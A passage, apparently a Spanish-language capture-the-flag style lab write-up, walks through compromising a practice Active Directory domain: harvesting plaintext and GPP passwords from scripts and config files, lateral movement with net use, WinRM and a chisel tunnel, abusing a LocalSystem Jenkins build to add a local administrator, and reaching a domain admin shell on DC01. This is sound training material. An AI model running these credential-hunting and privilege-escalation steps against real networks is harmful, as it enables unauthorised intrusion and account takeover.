+net use \\MGMT-SRV\agents$ /user:hack-academy\svc_update $!Doonite03
+xcopy \\MGMT-SRV\agents$\*.msi C:\Temp\agents\ /Y /Q
+net use \\MGMT-SRV\agents$ /delete
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PS C:\> type "\\CLIENT-1.hack-academy.local\InternalApps\deploy.ps1"
+# WebAPI Deployment Script
+# Deploys the internal WebAPI service on CLIENT-1
+# Last modified: 2024-08-19
+
+$DeployUser = "hack-academy\svc_webapi"
+$DeployPass = "Andrew,3"
+$ServicePath = "C:\Services\WebAPI"
+$ServiceName = "WebAPIService"
+
+$SecurePass = ConvertTo-SecureString $DeployPass -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($DeployUser, $SecurePass)
+
+Write-Host "[*] Deploying WebAPI service as $DeployUser..."
+Copy-Item "\\FILESERV01\deploy\webapi-svc.exe" -Destination $ServicePath -Credential $Cred
+sc.exe start $ServiceName
+Write-Host "[+] WebAPI deployment complete."
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PS C:\> type "\\DC01.hack-academy.local\SYSVOL\hack-academy.local\Policies\{F82E0F7A-E4F5-483E-8903-C80A1212F069}\User\Preferences\Groups\Groups.xml"
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}">
+  <Group clsid="{6D4A79E4-529C-4481-ABD0-F5BD7EA93BA7}" name="Administrators (built-in)" image="2" changed="2023-06-15 09:22:43" uid="{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}" userContext="0" removePolicy="0">
+    <Properties action="U" newName="" description="" deleteAllUsers="0" deleteAllGroups="0" removeAccounts="0" groupSid="S-1-5-32-544" groupName="Administrators (built-in)">
+      <Members>
+        <Member name="HACK-ACADEMY\kpatel" action="ADD" sid="" cpassword="rA45Z6a1zejGx2Jz9JoTHyXJVuZF/Eo0Ufw8+qVCVMw=" changed="2023-06-15 09:22:43" />
+      </Members>
+    </Properties>
+  </Group>
+</Groups>
+
+PS C:\>
+```
+
+
+---
+
+### User Hunting kpatel
+
+```
+.\Snaffler.exe -s -d hack-academy.local -o snaffler.log -v data
+```
+La búsqueda permitió identificar varios archivos con credenciales almacenadas de forma insegura. En este punto ya disponía de las credenciales de `svc_update` y `svc_webapi`, por lo que me centré en identificar nueva información relacionada con otros usuarios, especialmente `kpatel`. 
+
+El archivo `Groups.xml` encontrado en SYSVOL mostró que la cuenta `HACK-ACADEMY\kpatel` era añadida al grupo local Administrators mediante GPP. Aunque inicialmente no conocía su contraseña, una búsqueda de archivos que contenían `kpatel` reveló `appsettings.json`, donde se encontraron las credenciales utilizadas por el servicio AppSync. De esta forma, obtuve las credenciales de `kpatel` y confirmé que la cuenta tenía privilegios de administrador local mediante la política GPP.
+```php
+PS C:\Services> Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include *.json,*.bak,*.bat,*.ps1,*.xml,*.config,*.ini,*.txt,*.cmd,*.vbs,*.rdp,*.sql,*.log | Where-Object { $_.FullName -match "kpatel" -or (Select-String -Path $_.FullName -Pattern "kpatel" -SimpleMatch -Quiet -ErrorAction SilentlyContinue) } | Select-Object FullName, LastWriteTime
+
+FullName                                                                                            LastWriteTime
+--------                                                                                            -------------
+C:\Services\WebConfig\appsettings.json                                                              4/13/2026 12:50:19 AM
+C:\Temp\snaffler.log                                                                                9/11/2026 10:08:07 PM
+C:\Users\svc_webapi\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 9/12/2026 12:00:32 PM
+C:\Windows\System32\20260911135008_users.json                                                       9/11/2026 1:50:08 PM
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PS C:\Services> type C:\Services\WebConfig\appsettings.json
+{
+  "AppSync": {
+    "TargetServer": "CLIENT-2",
+    "ServiceUser": "hack-academy\\kpatel",
+    "ServicePassword": "100%Mary",
+    "Endpoint": "http://CLIENT-2:8080/api/sync",
+    "Notes": "Jenkins API on CLIENT-2 - internal only, bound to localhost"
+  },
+  "Logging": {
+    "LogLevel": "Warning",
+    "LogPath": "C:\\Services\\WebAPI\\logs\\webapi.log"
+  }
+}
+PS C:\Services>
+```
+
+
+---
+
+Probé las credenciales de `kpatel` contra `CLIENT-2` mediante SMB y la autenticación fue correcta. Con esto confirmé que las credenciales encontradas en `appsettings.json` eran válidas y que `kpatel` podía autenticarse contra `CLIENT-2`.
+```php
+PS C:\Services> net use \\CLIENT-2.hack-academy.local\IPC$ /user:hack-academy\kpatel "100%Mary"
+The command completed successfully.
+
+PS C:\Services>
+```
+
+---
+
+### Client-2 
+
+Primero inicié una nueva sesión de PowerShell utilizando las credenciales de `kpatel`, cambiando el contexto de ejecución desde el usuario actual a `hack-academy\kpatel`. Una vez dentro, comprobé el usuario y el equipo para confirmar que estaba ejecutando la sesión como `kpatel` en `CLIENT-1`.
+
+Después utilicé la sesión de PowerShell Remoting para conectarme desde `CLIENT-1` a `CLIENT-2`. Una vez establecida la conexión, volví a comprobar el usuario y el hostname para confirmar que la sesión remota se había establecido correctamente como `hack-academy\kpatel` en `CLIENT-2`.
+![Sesión de PowerShell Remoting como kpatel en CLIENT-2](04-psremoting-kpatel.png)
+
+---
+
+### Transfers Tools
+
+Con `net use \\10.0.2.128\C$ /user:hack-academy\svc_webapi "Andrew,3"` me conecto desde **CLIENT-2** al recurso administrativo `C$` de **10.0.2.128** utilizando las credenciales de `hack-academy\svc_webapi`, lo que me permite acceder al disco `C:` de esa máquina mediante SMB; después, con `echo F | xcopy \\10.0.2.128\C$\Temp\PowerView.ps1 C:\Temp\PowerView.ps1` copio el archivo **PowerView.ps1** desde la carpeta `C:\Temp` de la máquina remota hacia `C:\Temp` de **CLIENT-2**, indicando con `F` que el destino es un **archivo** y no un directorio, y finalmente con `dir` compruebo que el archivo se ha copiado correctamente y que tiene un tamaño de **770279 bytes**.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\Temp> net use \\10.0.2.128\C$ /user:hack-academy\svc_webapi "Andrew,3"
+The command completed successfully.
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+[CLIENT-2.hack-academy.local]: PS C:\ADTools> echo F | xcopy \\10.0.2.128\C$\Temp\PowerView.ps1 C:\ADTools\PowerView.ps1
+Does C:\ADTools\PowerView.ps1 specify a file name
+or directory name on the target
+(F = file, D = directory)? F
+\\10.0.2.128\C$\Temp\PowerView.ps1
+1 File(s) copied
+[CLIENT-2.hack-academy.local]: PS C:\ADTools>
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+```
+
+---
+
+Con `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass` cambio la política de ejecución **solo para la sesión actual de PowerShell**, permitiendo ejecutar scripts como `PowerView.ps1` sin modificar permanentemente la configuración del sistema; después, con `Import-Module .\PowerView.ps1` cargo **PowerView**
+```bash
+[CLIENT-2.hack-academy.local]: PS C:\Temp> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
+[CLIENT-2.hack-academy.local]: PS C:\Temp> Import-Module .\PowerView.ps1
+```
+
+---
+
+### Jenkins
+
+Durante la enumeración de servicios en `CLIENT-2`, encontré el servicio **Jenkins**, configurado para ejecutarse automáticamente y utilizando la cuenta **`LocalSystem`**. El ejecutable se encuentra en `C:\Program Files\Jenkins\jenkins.exe`. Esto es interesante porque Jenkins tiene privilegios elevados al ejecutarse como `LocalSystem`, por lo que si consigo identificar una vulnerabilidad en la instalación, una mala configuración o permisos de escritura sobre el servicio, su directorio o el ejecutable, podría utilizarlo como vía para obtener una sesión con privilegios elevados. Sin embargo, `Invoke-PrivescCheck` no identificó directamente permisos de modificación sobre el servicio o su binario para el usuario actual, por lo que este hallazgo requiere una enumeración adicional de Jenkins.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\ADTools> Invoke-PrivescCheck
+
+Name        : Jenkins
+DisplayName : Jenkins
+ImagePath   : "C:\Program Files\Jenkins\jenkins.exe"
+User        : LocalSystem
+StartMode   : Automatic
+
+```
+
+
+Con `netstat -ano | findstr LISTENING` revisé los puertos que están escuchando y el PID de cada proceso. Me llamó la atención `127.0.0.1:8080`, asociado al PID `2960`, así que voy a identificar qué proceso utiliza ese puerto donde seguramente corra Jenkins.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\> netstat -ano | findstr LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       864
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       652
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       644
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       484
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       620
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       360
+  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       1980
+  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       644
+  TCP    0.0.0.0:49670          0.0.0.0:0              LISTENING       624
+  TCP    0.0.0.0:49671          0.0.0.0:0              LISTENING       1888
+  TCP    10.0.2.129:139         0.0.0.0:0              LISTENING       4
+  TCP    127.0.0.1:8080         0.0.0.0:0              LISTENING       2960
+  TCP    [::]:135               [::]:0                 LISTENING       864
+  TCP    [::]:445               [::]:0                 LISTENING       4
+  TCP    [::]:5985              [::]:0                 LISTENING       4
+  TCP    [::]:47001             [::]:0                 LISTENING       4
+  TCP    [::]:49664             [::]:0                 LISTENING       644
+  TCP    [::]:49665             [::]:0                 LISTENING       484
+  TCP    [::]:49666             [::]:0                 LISTENING       620
+  TCP    [::]:49667             [::]:0                 LISTENING       360
+  TCP    [::]:49668             [::]:0                 LISTENING       1980
+  TCP    [::]:49669             [::]:0                 LISTENING       644
+  TCP    [::]:49670             [::]:0                 LISTENING       624
+  TCP    [::]:49671             [::]:0                 LISTENING       1888
+[CLIENT-2.hack-academy.local]: PS C:\>
+```
+
+
+---
+
+
+OK como la idea es hacer pivoting pero no hasta mi parrot si no hasta el CLIENT-1 ya que tengo acceso RDP y Soy admin pues averiguamos la arquitectura para ir por nuestro chisel.
+```php
+PS C:\Temp> $env:PROCESSOR_ARCHITECTURE
+AMD64
+PS C:\Temp>
+```
+
+
+Ok en CLIENTE-1 ejecutamos como servidor ah chisel, luego en CLIENTE-2 nos conectamos como cliente al servidor que nos esta compartiendo CLIENTE-1. 
+![Chisel corriendo como servidor en CLIENT-1](05-chisel-server.png)
+
+Ahora ya podemos observar la pagina web que corre en CLIENTE-2 desde CLIENTE-1.
+![Panel web de Jenkins accesible vía tunel chisel](06-jenkins-web.png)
+
+Ok nos dirigimos hasta esa ruta donde obtenemos una contraseña.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\> type C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword
+495b5b02d07e418e8ef8ea31db16f893
+[CLIENT-2.hack-academy.local]: PS C:\>
+```
+
+
+
+----
+
+### Privilege Escalation For Jenkins
+
+Ok una vez hemos iniciado session con la secrets que hemos encontrado, Paso numero uno vamos ah crear una tarea para escalar privilegios porque, recordemos lo que enccontramos con PrivessCheck el servicio lo ejecuta LocalSystem.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\ADTools> Invoke-PrivescCheck
+
+Name        : Jenkins
+DisplayName : Jenkins
+ImagePath   : "C:\Program Files\Jenkins\jenkins.exe"
+User        : LocalSystem
+StartMode   : Automatic
+```
+![PrivescCheck mostrando el servicio Jenkins como LocalSystem](07-privesccheck-jenkins.png)
+
+
+Luego seguimos los pasos de la siguiente imagen 
+![Configuración de la tarea de build en Jenkins (paso 1)](08-jenkins-task-1.png)
+
+
+Seguimos
+![Configuración de la tarea de build en Jenkins (paso 2)](09-jenkins-task-2.png)
+
+
+Ok ahora lo tenemos preparado para hacer un test, recordemos que este servicio lo ejecuta Admin el LocalSystem
+![Test de ejecución del build en Jenkins](10-jenkins-build-test.png)
+
+
+
+Le damos Build Now y que se corra el comando como recordaremos de la imagen anterior este archivo se guardaria en  C:\ADTools con el nombre test.txt.
+![Ejecución del build (Build Now) en Jenkins](11-jenkins-build-now.png)
+
+
+Ok el comando se ejecuta y se ejecuta como nt authority\system, Ya tenemos una via potencial para escalar privilegios.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\ADTools> type .\test.txt
+nt authority\system
+```
+
+Ok, entonces repetimos el procedimiento que hicimos en las dos últimas imágenes. En la penúltima imagen, en lugar de ejecutar `whoami`, vamos a ejecutar el siguiente comando:
+
+```powershell
+net localgroup administrators kpatel /add
+```
+
+Esto agregará al usuario `kpatel` al grupo local `Administrators`, otorgándole privilegios administrativos sobre la máquina. Después, repetimos el procedimiento mostrado en la última imagen para obtener una nueva sesión con los privilegios del usuario y comprobar que la escalada se realizó correctamente.
+
+
+---
+
+
+Una vez ejecutado `net localgroup administrators kpatel /add`, comprobamos la pertenencia al grupo `Administrators`.
+
+En la lista de miembros aparece `HACK-ACADEMY\kpatel`, confirmando que el usuario fue agregado correctamente al grupo local de administradores de `CLIENT-2`. Esto nos proporciona privilegios administrativos sobre la máquina y nos permite continuar con el siguiente paso de la escalada.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\ADTools> net localgroup Administrators
+Alias name     Administrators
+Comment        Administrators have complete and unrestricted access to the computer/domain
+
+Members
+
+-------------------------------------------------------------------------------
+Administrator
+Alex
+HACK-ACADEMY\Domain Admins
+HACK-ACADEMY\kpatel
+The command completed successfully.
+
+[CLIENT-2.hack-academy.local]: PS C:\ADTools>
+```
+
+
+Después de agregar `HACK-ACADEMY\kpatel` al grupo local `Administrators`, la sesión que ya tenía abierta no reflejaba inmediatamente los nuevos privilegios, ya que el token de acceso se genera al iniciar sesión. Por este motivo, tuve que volver a iniciar sesión como `kpatel` desde `CLIENT-1` utilizando `runas`. Al crear una nueva sesión, Windows generó un nuevo token de acceso que ya incluía la pertenencia al grupo `BUILTIN\Administrators`.
+
+----
+
+
+
+### Post-Explotacion
+
+### BloodHound.
+
+Ejecutamos BloodHound en Client-1 ya que ese usuario esta unido al dominio kpatel no.
+```php
+PS C:\Temp> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Temp -ZipFileName bloodhound.zip
+ 70 name to SID mappings.
+ 1 machine sid mappings.
+ 2 sid to domain mappings.
+ 0 global catalog mappings.
+2026-09-15T19:35:07.6303767-07:00|INFORMATION|SharpHound Enumeration Completed at 7:35 PM on 9/15/2026! Happy Graphing!
+PS C:\Temp>
+```
+
+
+Podemos observar que **SVC_ADMIN** pertenece a **Domain Admins**, por lo que tiene privilegios elevados en el dominio. Ahora que somos administradores en **CLIENT-2**, desde aquí vamos a enumerar todo lo relacionado con este usuario para identificar posibles vectores de escalada o movimiento lateral.
+![BloodHound mostrando a SVC_ADMIN como miembro de Domain Admins](12-bloodhound-svcadmin.png)
+
+-----
+
+### User Hunting SVC_ADMIN
+
+Con este comando hacemos una búsqueda recursiva en todo *_C:*_ de archivos que puedan contener referencias a **SVC_ADMIN**, filtrando extensiones comunes como `.ps1`, `.bat`, `.xml`, `.config`, `.txt`, `.log`, etc. El resultado destaca **C:\Scripts\BackupSync.ps1**, que podría ser interesante porque contiene una referencia a SVC_ADMIN, así que el siguiente paso sería revisar su contenido para comprobar si expone credenciales, rutas, permisos o alguna configuración que podamos aprovechar.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\Users> Get-ChildItem -Path C:\ -Recurse -Force -ErrorAction SilentlyContinue -Include *.json,*.bak,*.bat,*.ps1,*.xml,*.config,*.ini,*.txt,*.cmd,*.vbs,*.rdp,*.sql,*.log | Where-Object { $_.FullName -match "SVC_ADMIN" -or (Select-String -Path $_.FullName -Pattern "SVC_ADMIN" -SimpleMatch -Quiet -ErrorAction SilentlyContinue) } | Select-Object FullName, LastWriteTime
+
+FullName                                 LastWriteTime
+--------                                 -------------
+C:\Scripts\BackupSync.ps1                4/13/2026 1:20:05 AM
+C:\Windows\INF\UGTHRSVC\0000\gthrctr.ini 12/7/2019 1:08:27 AM
+C:\Windows\INF\UGTHRSVC\0409\gthrctr.ini 12/7/2019 1:49:50 AM
+C:\Windows\WinSxS\amd64_windowssearch... 12/7/2019 1:49:50 AM
+C:\Windows\WinSxS\amd64_windowssearch... 12/7/2019 1:08:27 AM
+
+
+[CLIENT-2.hack-academy.local]: PS C:\Users>
+```
+
+
+Aquí encontramos una **credencial expuesta directamente en el script `BackupSync.ps1`**: el usuario es `hack-academy\svc_admin` y la contraseña está almacenada en texto plano. Como `SVC_ADMIN` pertenece a **Domain Admins**, esta información podría permitirnos autenticarnos directamente con una cuenta con privilegios elevados y continuar con la enumeración del dominio.
+```php
+[CLIENT-2.hack-academy.local]: PS C:\> type C:\Scripts\BackupSync.ps1
+# BackupSync - Syncs finance data to DC backup share
+# Runs nightly at 2:00 AM via scheduled task
+# Maintained by IT Operations
+
+$Username = "hack-academy\svc_admin"
+$Password = "-Berlin-"
+$SecurePass = ConvertTo-SecureString $Password -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential($Username, $SecurePass)
+
+$SourcePath = "C:\Finance\Reports"
+$DestPath   = "\\DC01\FinanceBackup"
+
+try {
+    Copy-Item -Path $SourcePath -Destination $DestPath -Recurse -Force -Credential $Cred
+    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1001 -EntryType Information -Message "Backup completed successfully."
+} catch {
+    Write-EventLog -LogName Application -Source "BackupSync" -EventId 1002 -EntryType Error -Message "Backup failed: $_"
+}
+[CLIENT-2.hack-academy.local]: PS C:\>
+```
+
+
+### Test Credentials
+
+Con `net use` comprobamos que las credenciales de **SVC_ADMIN** son válidas y conseguimos autenticarnos correctamente contra **DC01** mediante `IPC$`. Esto confirma que podemos utilizar esta cuenta para acceder a recursos del dominio con sus privilegios actuales. 
+```php
+[CLIENT-2.hack-academy.local]: PS C:\> net use \\DC01.hack-academy.local\IPC$ /user:hack-academy\svc_admin "-Berlin-"
+The command completed successfully.
+```
+
+
+----
+
+
+### DC01
+
+Con `winrs` utilizamos las credenciales de **SVC_ADMIN** para obtener una sesión remota en **DC01**, confirmando que la cuenta tiene permisos suficientes para ejecutar comandos remotamente sobre el controlador de dominio. Al ejecutar `hostname` comprobamos que nuestra sesión se encuentra efectivamente en **DC01**.
+```php
+PS C:\Users> winrs -remote:DC01.hack-academy.local -u:hack-academy\svc_admin -p:"-Berlin-" cmd.exe
+Microsoft Windows [Version 10.0.20348.169]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\svc_admin>hostname
+hostname
+DC01
+```
+
+
+
+Consultamos específicamente **svc_admin**, confirmando que la cuenta está activa, la contraseña no expira y, lo más importante, pertenece a **Domain Admins**, por lo que tiene privilegios administrativos sobre el dominio.
+```php
+C:\Users\svc_admin>net user svc_admin /domain
+net user svc_admin /domain
+User name                    svc_admin
+Full Name
+Comment                      Backup and sync service account
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            4/13/2026 12:45:06 AM
+Password expires             Never
+Password changeable          4/14/2026 12:45:06 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   9/15/2026 8:18:10 PM
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Domain Users         *Domain Admins
+The command completed successfully.
+
+
+C:\Users\svc_admin>
+```
